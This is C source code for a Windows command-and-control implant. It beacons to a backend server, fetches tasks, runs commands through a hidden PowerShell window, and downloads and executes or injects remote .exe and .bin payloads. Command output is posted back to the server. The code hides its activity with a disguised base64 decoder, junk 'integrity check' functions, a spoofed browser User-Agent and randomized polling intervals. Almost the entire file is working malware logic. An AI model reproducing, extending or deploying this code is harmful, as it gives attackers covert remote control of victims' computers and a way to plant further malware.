
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include "../include/Defines.h"
#include "../include/cJSON.h"

wchar_t SCLIENT_ID[256] = L"test1cppsssssssssssssssssss";
wchar_t Backend[256] = L"http://localhostsssssssssssssssssssssssss:5000";
wchar_t CHECK_INTERVAL[256] = L"50000";



typedef struct {
    wchar_t* command;
    wchar_t* entry_point;
    wchar_t* file_path;
    int task_id;
    wchar_t* type;
} CommandTask;

typedef struct {
    wchar_t* client_id;
    int task_id;
    wchar_t* command;
    wchar_t* result;
} Result;


void CheckDataIntegrity() {
    double a = 123.456;
    double b = sin(a) * cos(a);
    for (int i = 0; i < 100; i++) {
        b = b * b - a;
    }
}

void validate_matrix() {
    int matrix[3][3] = { {1, 2, 3}, {4, 5, 6}, {7, 8, 9} };
    for (int i = 0; i < 3; i++) {
        for (int j = 0; j < 3; j++) {
            matrix[i][j] = (matrix[i][j] * 2) ^ 0xDEADBEEF;
        }
    }
}

void memory_pattern_Verify() {
    char dummy_data[256];
    for (int i = 0; i < 256; i++) {
        dummy_data[i] = (char)(i ^ (i - 1));
    }
}


char* unjumble(const char* input) {
    int len = strlen(input);
    char* result = malloc(len + 1);
    if (!result) return NULL;

    int even_len = (len + 1) / 2;
    int odd_len = len - even_len;

    int even_idx = 0;
    int odd_idx = even_len;

    for (int i = 0; i < len; i++) {
        if (i % 2 == 0)
            result[i] = input[even_idx++];
        else
            result[i] = input[odd_idx++];
    }

    result[len] = '\0';
    return result;
}

wchar_t* UTF8ToWide(const char* str) {
    size_t len = strlen(str);
    wchar_t* wstr = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
    for (size_t i = 0; i < len; i++) wstr[i] = (wchar_t)str[i];
    wstr[len] = L'\0';
    return wstr;
}

wchar_t* GetDir() {
    static wchar_t tempPath[MAX_PATH] = { 0 };
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        wcscpy_s(tempPath, MAX_PATH, L"C:\\Windows\\Temp\\");
    }
    return _wcsdup(tempPath);
}

wchar_t* GenerateRandomName(int length) {
    const wchar_t alphabet[] = L"abcdef1234";
    wchar_t* name = (wchar_t*)malloc((length + 1) * sizeof(wchar_t));
    if (!name) return NULL;

    srand((unsigned int)time(NULL));
    for (int i = 0; i < length; i++) {
        name[i] = alphabet[rand() % (wcslen(alphabet))];
    }
    name[length] = L'\0';
    return name;
}




static wchar_t* Utf8BufferToWide(const char* utf8, size_t len) {
    if (!utf8) return NULL;
    int needed = MultiByteToWideChar(CP_UTF8, 0, utf8, (int)len, NULL, 0);
    if (needed <= 0) {
        wchar_t* empty = (wchar_t*)malloc(sizeof(wchar_t));
        if (empty) empty[0] = L'\0';
        return empty;
    }
    wchar_t* out = (wchar_t*)malloc((needed + 1) * sizeof(wchar_t));
    if (!out) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, utf8, (int)len, out, needed);
    out[needed] = L'\0';
    return out;
}




char annote_map[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                     'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                     'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/' };


char* annote64(char* cipher) {

    char counts = 0;
    char buffer[4];
    char* plain = malloc(strlen(cipher) * 3 / 4);
    int i = 0, p = 0;

    for (i = 0; cipher[i] != '\0'; i++) {
        char k;
        for (k = 0; k < 64 && annote_map[k] != cipher[i]; k++);
        buffer[counts++] = k;
        if (counts == 4) {
            plain[p++] = (buffer[0] << 2) + (buffer[1] >> 4);
            if (buffer[2] != 64)
                plain[p++] = (buffer[1] << 4) + (buffer[2] >> 2);
            if (buffer[3] != 64)
                plain[p++] = (buffer[2] << 6) + buffer[3];
            counts = 0;
        }
    }

    plain[p] = '\0';
    return plain;
}

wchar_t* DecodeToWString(wchar_t* szInput)
{
    if (!szInput) return NULL;

    size_t len = wcslen(szInput);
    char* narrowInput = (char*)malloc(len + 1);
    if (!narrowInput) return NULL;
    wcstombs(narrowInput, szInput, len + 1);

    char* decoded = annote64(narrowInput);
    free(narrowInput);
    if (!decoded) return NULL;

    size_t wlen = mbstowcs(NULL, decoded, 0); 
    wchar_t* result = (wchar_t*)malloc((wlen + 1) * sizeof(wchar_t));
    if (!result) {
        free(decoded);
        return NULL;
    }
    mbstowcs(result, decoded, wlen + 1);

    free(decoded);

    return result; 
}



wchar_t* EcSock(const BYTE* data, SIZE_T size, PWSTR loc) {
    INJ_Resul result;

    if (ProcesssData(data, size, &result, loc)) {

        static wchar_t buffer[128];
        swprintf(buffer, sizeof(buffer) / sizeof(buffer[0]), L"Success");
        return buffer;
    }

    return L" failed.";
}



wchar_t* CheckD(const wchar_t* url, wchar_t* entry_point) {
    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    wchar_t host[256] = { 0 };
    wchar_t path[2048] = { 0 };

    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = ARRAYSIZE(host);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = ARRAYSIZE(path);

    if (!WinHttpCrackUrl(url, wcslen(url), 0, &urlComp)) {
        return _wcsdup(L"URL parsing failed");
    }

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSession) return _wcsdup(L"WinHttpOpen failed");

    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return _wcsdup(L"WinHttpConnect failed");
    }

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ?
        WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", path, NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return _wcsdup(L"WinHttpOpenRequest failed");
    }

    wchar_t refererOrigin[512] = { 0 };
    swprintf_s(refererOrigin, ARRAYSIZE(refererOrigin), L"%s://%s",
        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? L"https" : L"http",
        host);

    wchar_t headers[1024] = { 0 };
    swprintf_s(headers, ARRAYSIZE(headers),
        L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/117.0.0.0 Safari/537.36\r\n"
        L"Accept: application/json, text/javascript, */*; q=0.01\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Accept-Encoding: gzip, deflate, br\r\n"
        L"Connection: keep-alive\r\n"
        L"X-Requested-With: XMLHttpRequest\r\n"
        L"Referer: %s\r\n"
        L"Origin: %s\r\n"
        L"X-Client-Id: %s\r\n",
        refererOrigin,
        refererOrigin
    );

    WinHttpAddRequestHeaders(hRequest, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
        0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return _wcsdup(L"Request failed");
    }

    BYTE* data = NULL;
    DWORD dataSize = 0;
    BYTE buffer[4096];
    DWORD bytesRead = 0;

    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        BYTE* newData = (BYTE*)realloc(data, dataSize + bytesRead);
        if (!newData) break;
        data = newData;
        mycpy(data + dataSize, buffer, bytesRead);
        dataSize += bytesRead;
    }

    wchar_t* result = NULL;
    if (data) {
        result = EcSock(data, dataSize, entry_point);
        free(data);
    }
    else {
        result = _wcsdup(L"No data received");
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

wchar_t* CheckEx(const wchar_t* url, PWSTR Arguments) {
    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    wchar_t host[256] = { 0 };
    wchar_t path[2048] = { 0 };

    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = ARRAYSIZE(host);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = ARRAYSIZE(path);

    if (!WinHttpCrackUrl(url, wcslen(url), 0, &urlComp)) {
        return _wcsdup(L"URL parsing failed");
    }

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSession) return _wcsdup(L"WinHttpOpen failed");

    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return _wcsdup(L"WinHttpConnect failed");
    }



    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ?
        WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", path, NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return _wcsdup(L"WinHttpOpenRequest failed");
    }


    wchar_t refererOrigin[512] = { 0 };
    swprintf_s(refererOrigin, ARRAYSIZE(refererOrigin), L"%s://%s",
        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? L"https" : L"http",
        host);

    wchar_t headers[1024] = { 0 };
    swprintf_s(headers, ARRAYSIZE(headers),
        L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/117.0.0.0 Safari/537.36\r\n"
        L"Accept: application/json, text/javascript, */*; q=0.01\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Accept-Encoding: gzip, deflate, br\r\n"
        L"Connection: keep-alive\r\n"
        L"X-Requested-With: XMLHttpRequest\r\n"
        L"Referer: %s\r\n"
        L"Origin: %s\r\n"
        L"X-Client-Id: %s\r\n",
        refererOrigin,
        refererOrigin
    );

    WinHttpAddRequestHeaders(hRequest, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD);

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
        0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return _wcsdup(L"Request failed");
    }

    BYTE* data = NULL;
    DWORD dataSize = 0;
    BYTE buffer[4096];
    DWORD bytesRead = 0;

    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        BYTE* newData = (BYTE*)realloc(data, dataSize + bytesRead);
        if (!newData) break;
        data = newData;
        mycpy(data + dataSize, buffer, bytesRead);
        dataSize += bytesRead;
    }

    wchar_t* result = NULL;
    if (data) {
        result = CheckIn(data, dataSize, Arguments);
        free(data);
    }
    else {
        result = _wcsdup(L"No data received");
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}
char* WideToUTF8(const wchar_t* wstr) {
    if (!wstr) return NULL;
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    char* strTo = (char*)malloc(size_needed);
    if (!strTo) return NULL;
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, strTo, size_needed, NULL, NULL);
    return strTo;
}


static char* JsonEscape(const char* input) {
    if (!input) return NULL;
    size_t len = strlen(input);
    char* out = (char*)malloc(len * 6 + 1);
    if (!out) return NULL;

    char* p = out;
    for (size_t i = 0; i < len; i++) {
        switch (input[i]) {
        case '"':  *p++ = '\\'; *p++ = '"'; break;
        case '\\': *p++ = '\\'; *p++ = '\\'; break;
        case '\b': *p++ = '\\'; *p++ = 'b'; break;
        case '\f': *p++ = '\\'; *p++ = 'f'; break;
        case '\n': *p++ = '\\'; *p++ = 'n'; break;
        case '\r': *p++ = '\\'; *p++ = 'r'; break;
        case '\t': *p++ = '\\'; *p++ = 't'; break;
        default:
            if ((unsigned char)input[i] < 0x20) {
                sprintf(p, "\\u%04x", (unsigned char)input[i]);
                p += 6;
            }
            else {
                *p++ = input[i];
            }
            break;
        }
    }
    *p = '\0';
    return out;
}

char* BuildResultJson(const Result* payload) {
    if (!payload || !payload->client_id || !payload->result) return NULL;

    char* client_id_utf8 = WideToUTF8(payload->client_id);
    char* result_utf8 = WideToUTF8(payload->result);
    if (!client_id_utf8 || !result_utf8) {
        free(client_id_utf8); free(result_utf8);
        return NULL;
    }

    char* client_escaped = JsonEscape(client_id_utf8);
    char* result_escaped = JsonEscape(result_utf8);
    free(client_id_utf8);
    free(result_utf8);

    if (!client_escaped || !result_escaped) {
        free(client_escaped); free(result_escaped);
        return NULL;
    }

    size_t bufsize = strlen(client_escaped) + strlen(result_escaped) + 64;
    if (payload->task_id > 0) bufsize += 16;

    char* json = (char*)malloc(bufsize);
    if (!json) {
        free(client_escaped); free(result_escaped);
        return NULL;
    }

    if (payload->task_id > 0) {
        snprintf(json, bufsize,
            "{ \"client_id\": \"%s\", \"task_id\": %d, \"result\": \"%s\" }",
            client_escaped, payload->task_id, result_escaped);
    }
    else {
        snprintf(json, bufsize,
            "{ \"client_id\": \"%s\", \"task_id\": null, \"result\": \"%s\" }",
            client_escaped, result_escaped);
    }

    free(client_escaped); free(result_escaped);
    return json;
}

bool SendResult(const Result* payload) {
    char* json = BuildResultJson(payload);
    if (!json) return false;

    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    wchar_t host[256] = { 0 };
    wchar_t path[2048] = { 0 };
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = ARRAYSIZE(host);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = ARRAYSIZE(path);

    wchar_t* decoded = DecodeToWString(Backend);
    if (!decoded || !WinHttpCrackUrl(decoded, wcslen(decoded), 0, &urlComp)) {
        if (decoded) LocalFree(decoded);
        free(json);
        return false;
    }
    LocalFree(decoded);

    wchar_t refererOrigin[512] = { 0 };
    swprintf_s(refererOrigin, ARRAYSIZE(refererOrigin), L"%s://%s",
        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? L"https" : L"http", host);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { free(json); return false; }

    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
    if (!hConnect) { free(json); WinHttpCloseHandle(hSession); return false; }

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/saveresult",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { free(json); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }


    wchar_t headers[1024] = { 0 };
    swprintf_s(headers, ARRAYSIZE(headers),
        L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/117.0.0.0 Safari/537.36\r\n"
        L"Accept: application/json, text/javascript, */*; q=0.01\r\n"
        L"Content-Type: application/json; charset=utf-8\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Accept-Encoding: gzip, deflate, br\r\n"
        L"Connection: keep-alive\r\n"
        L"X-Requested-With: XMLHttpRequest\r\n"
        L"Referer: %s\r\n"
        L"Origin: %s\r\n"
        L"X-Client-Id: %s\r\n",
        refererOrigin,
        refererOrigin,
        SCLIENT_ID);

    WinHttpAddRequestHeaders(hRequest, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD);

    DWORD jsonLength = (DWORD)strlen(json);
    bool success = false;
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)json, jsonLength, jsonLength, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        success = true;
    }

    free(json);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

CommandTask* ParseTasks(const char* jsonStr, int* taskCount)
{
    if (!jsonStr || !taskCount)
        return NULL;

    *taskCount = 0;

    cJSON* root = cJSON_Parse(jsonStr);
    if (!root || !cJSON_IsArray(root)) {
        cJSON_Delete(root);
        return NULL;
    }

    int count = cJSON_GetArraySize(root);
    if (count <= 0) {
        cJSON_Delete(root);
        return NULL;
    }

    CommandTask* tasks = calloc(count, sizeof(CommandTask));
    if (!tasks) {
        cJSON_Delete(root);
        return NULL;
    }

    for (int i = 0; i < count; i++) {
        cJSON* item = cJSON_GetArrayItem(root, i);
        if (!cJSON_IsObject(item))
            continue;

        cJSON* field;

        field = cJSON_GetObjectItem(item, "task_id");
        if (cJSON_IsNumber(field))
            tasks[i].task_id = field->valueint;

        field = cJSON_GetObjectItem(item, "command");
        if (cJSON_IsString(field))
            tasks[i].command = UTF8ToWide(field->valuestring);

        field = cJSON_GetObjectItem(item, "entry_point");
        if (cJSON_IsString(field))
            tasks[i].entry_point = UTF8ToWide(field->valuestring);

        field = cJSON_GetObjectItem(item, "file_path");
        if (cJSON_IsString(field))
            tasks[i].file_path = UTF8ToWide(field->valuestring);

        field = cJSON_GetObjectItem(item, "type");
        if (cJSON_IsString(field))
            tasks[i].type = UTF8ToWide(field->valuestring);
    }

    *taskCount = count;
    cJSON_Delete(root);
    return tasks;
}

wchar_t* PowerUp(const wchar_t* command) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        wchar_t* error = (wchar_t*)malloc(256 * sizeof(wchar_t));
        swprintf_s(error, 256, L" failed: %d", GetLastError());
        return error;
    }

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    wchar_t cmdLine[4096];
    swprintf_s(cmdLine, 4096, L"powershell.exe -Command \"%s\"", command);

    if (!CreateProcessW(
        NULL, cmdLine, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    )) {
        CloseHandle(hWrite);
        CloseHandle(hRead);
        wchar_t* error = (wchar_t*)malloc(256 * sizeof(wchar_t));
        swprintf_s(error, 256, L" failed: %d", GetLastError());
        return error;
    }

    CloseHandle(hWrite);

    char buffer[4096];
    DWORD bytesRead;
    size_t outputSize = 0;
    char* output = NULL;

    while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
        char* newOutput = (char*)realloc(output, outputSize + bytesRead + 1);
        if (!newOutput) break;
        output = newOutput;
        memcpy(output + outputSize, buffer, bytesRead);
        outputSize += bytesRead;
    }

    if (output) {
        output[outputSize] = '\0';
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    wchar_t* result = output ? UTF8ToWide(output) : _wcsdup(L"");
    free(output);
    return result;
}


void ProcessTask(const CommandTask* task) {
    wchar_t* serverUrl = DecodeToWString(Backend);

    Result DataRES = {
        .client_id = _wcsdup(SCLIENT_ID),
        .task_id = task->task_id,
        .command = _wcsdup(task->command),
        .result = NULL
    };

    wchar_t* result = NULL;
    wchar_t* tempDir = GetDir();

    if (task->command && wcslen(task->command) > 0) {

        result = PowerUp(task->command);
    }
    else if (task->file_path && wcslen(task->file_path) > 0) {
        wchar_t* decodedPath = DecodeToWString(task->file_path);
        size_t len = wcslen(decodedPath);

        if (len > 4 && _wcsicmp(decodedPath + len - 4, L".exe") == 0) {

            wchar_t url[2048];
            swprintf_s(url, 2048, L"%s/Get?path=%s", serverUrl, task->file_path);
            result = CheckEx(url, NULL);
        }
        else if (len > 4 && _wcsicmp(decodedPath + len - 4, L".bin") == 0) {

            wchar_t url[2048];
            swprintf_s(url, 2048, L"%s/Get?path=%s", serverUrl, task->file_path);
            result = CheckD(url, task->entry_point);

        }

        else {
            result = _wcsdup(L"Unsupported");
        }

        if (decodedPath)
        {
            free(decodedPath);
        }
    }
    else {
        result = _wcsdup(L"Unsupported task");
    }


    DataRES.result = result ? result : _wcsdup(L"");

    if (!SendResult(&DataRES)) {
    }


    if (DataRES.client_id) {
        free(DataRES.client_id);
        DataRES.client_id = NULL;
    }
    if (DataRES.command) {
        free(DataRES.command);
        DataRES.command = NULL;
    }
    if (tempDir) {
        free(tempDir);
        tempDir = NULL;
    }

}

CommandTask* PollServer(int* taskCount) {
    *taskCount = 0;
    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    wchar_t host[256] = { 0 };
    wchar_t path[2048] = { 0 };

    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = ARRAYSIZE(host);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = ARRAYSIZE(path);
    wchar_t* decoded = DecodeToWString(Backend);

    if (!decoded || wcslen(decoded) == 0) {
        return NULL;
    }
    if (!WinHttpCrackUrl(decoded, wcslen(decoded), 0, &urlComp)) {
        return NULL;
    }
    LocalFree((HLOCAL)decoded);

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(
        hSession, host, urlComp.nPort, 0
    );
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    wchar_t query[2048];
    swprintf_s(query, 2048, L"/check?client_id=%s", SCLIENT_ID);

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ?
        WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", query,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, flags
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    wchar_t refererOrigin[512] = { 0 };
    swprintf_s(refererOrigin, ARRAYSIZE(refererOrigin), L"%s://%s",
        (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? L"https" : L"http",
        host);

    wchar_t headers[1024] = { 0 };
    swprintf_s(headers, ARRAYSIZE(headers),
        L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/117.0.0.0 Safari/537.36\r\n"
        L"Accept: application/json, text/javascript, */*; q=0.01\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Accept-Encoding: gzip, deflate, br\r\n"
        L"Connection: keep-alive\r\n"
        L"X-Requested-With: XMLHttpRequest\r\n"
        L"Referer: %s\r\n"
        L"Origin: %s\r\n"
        L"X-Client-Id: %s\r\n",
        refererOrigin,
        refererOrigin
    );

    WinHttpAddRequestHeaders(hRequest, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD);

    CommandTask* tasks = NULL;
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
        0, NULL, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD size = 0;
        WinHttpQueryDataAvailable(hRequest, &size);
        if (size > 0) {
            char* buffer = (char*)malloc(size + 1);
            if (buffer) {
                DWORD downloaded;
                WinHttpReadData(hRequest, buffer, size, &downloaded);
                buffer[size] = '\0';
                tasks = ParseTasks(buffer, taskCount);
                free(buffer);
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return tasks;
}

void FreeTasks(CommandTask* tasks, int count) {
    for (int i = 0; i < count; i++) {
        if (tasks[i].command) free(tasks[i].command);
        if (tasks[i].entry_point) free(tasks[i].entry_point);
        if (tasks[i].file_path) free(tasks[i].file_path);
        if (tasks[i].type) free(tasks[i].type);
    }
    free(tasks);
}



unsigned int GetMachineSeed() {
    DWORD serialNumber = 0;
    GetVolumeInformationW(
        L"C:\\",       // system drive
        NULL, 0,       // volume name buffer (unused)
        &serialNumber, // <- unique per system
        NULL, NULL, NULL, 0
    );

    if (serialNumber == 0)
        serialNumber = 0xDEADBEEF;

    // Simple hash (optional)
    unsigned int seed = serialNumber;
    seed = (seed ^ (seed >> 16)) * 0x45d9f3b;
    seed = (seed ^ (seed >> 16)) * 0x45d9f3b;
    seed = seed ^ (seed >> 16);
    return seed;
}

wchar_t* GenerateRandomNameFromSystem(int length) {
    const wchar_t alphabet[] = L"abcdef1234";
    wchar_t* name = (wchar_t*)malloc((length + 1) * sizeof(wchar_t));
    if (!name) return NULL;

    unsigned int seed = GetMachineSeed();
    srand(seed);

    size_t alphabetLen = wcslen(alphabet);
    for (int i = 0; i < length; i++)
        name[i] = alphabet[rand() % alphabetLen];

    name[length] = L'\0';
    return name;
}


int startWork()
{
    int x = 123;
    int y = 456;

    while (1) {

        if ((x * x) - (x + 1) * (x - 1) != 1) {
            CheckDataIntegrity();
        }


        int taskCount = 0;
        CommandTask* tasks = PollServer(&taskCount);


        if (y - x <= 333) {
            validate_matrix();
        }

        if (tasks) {
            for (int i = 0; i < taskCount; i++) {
                ProcessTask(&tasks[i]);
            }
            FreeTasks(tasks, taskCount);
        }


        int interval = _wtoi(CHECK_INTERVAL); if (interval <= 60) interval = 61;
        int minInterval = interval / 2;
        int maxInterval = interval + interval / 2;
        int randomizedInterval = minInterval + (rand() % (maxInterval - minInterval + 1));

        Sleep(randomizedInterval * 1000);


        if ((y * y) - (y + 1) * (y - 1) != 1) {
            break;
        }


    }

    return 0;
}

#ifdef _DEBUG
int main() {
#else
int WinMain() {
#endif
    return startWork();
}


